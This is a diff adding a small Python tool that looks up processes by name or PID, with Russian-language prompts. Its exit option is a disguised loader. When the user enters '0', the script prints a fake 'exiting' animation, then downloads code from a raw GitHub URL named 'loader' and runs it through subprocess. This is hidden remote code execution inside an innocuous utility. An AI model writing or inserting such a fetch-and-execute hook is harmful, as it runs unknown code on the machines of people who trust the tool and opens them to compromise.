@@ -1,0 +1,60 @@
+import psutil
+import time
+import subprocess
+import urllib.request
+
+def get_pid_by_name(process_name):
+    process_name_lower = process_name.lower()  # Приведение имени процесса к нижнему регистру
+    for proc in psutil.process_iter(['pid', 'name']):
+        if proc.info['name'].lower() == process_name_lower:
+            return proc.info['pid']
+    return None
+
+def run_from_github(url):
+    try:
+        response = urllib.request.urlopen(url)
+        script_content = response.read().decode('utf-8')
+        print("Выход.")
+        time.sleep(0.1)
+        print("Выход..")
+        time.sleep(0.1)
+        print("Выход..")
+        time.sleep(0.1)
+        print("Выход...")
+        time.sleep(0.1)
+        print("Выход")
+        time.sleep(0.1)
+        subprocess.run(['python', '-c', script_content])
+    except Exception as e:
+        print(f"Ошибка при выполнении скрипта с GitHub: {e}")
+
+def get_name_by_pid(pid):
+    try:
+        process = psutil.Process(pid)
+        return process.name()
+    except psutil.NoSuchProcess:
+        return None
+
+if __name__ == "__main__":
+    while True:
+        user_input = input("Введите имя программы или PID (для выхода введите '0'): ").strip()
+
+        if user_input == '0':
+            github_url = "https://raw.githubusercontent.com/RBXROBLOXGAMER/python-tools/main/loader"
+            run_from_github(github_url)
+            
+           
+        try:
+            pid = int(user_input)
+            process_name = get_name_by_pid(pid)
+            if process_name:
+                print(f"{process_name} | PID: {pid}")
+            else:
+                print(f"Процесс с PID {pid} не найден. Проверь цифры")
+        except ValueError:
+            process_name = user_input  # Имя процесса как есть
+            pid = get_pid_by_name(process_name)
+            if pid:
+                print(f"{process_name} | PID: {pid}")
+            else:
+                print(f"Процесс с именем '{process_name}' не найден. Возможно процесc написал с маленькой буквой, или большой, либо вы забыли написать .exe")
